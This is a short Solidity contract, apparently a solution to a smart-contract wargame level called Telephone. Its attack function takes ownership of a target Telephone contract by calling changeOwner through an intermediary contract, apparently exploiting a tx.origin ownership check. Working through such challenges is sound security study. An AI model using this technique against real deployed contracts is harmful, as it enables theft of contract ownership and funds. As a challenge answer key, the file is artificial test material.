// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public t;
    function attack(address target) public {
        t = Telephone(target);
        address myAddress = msg.sender;
        t.changeOwner(myAddress);
    }
}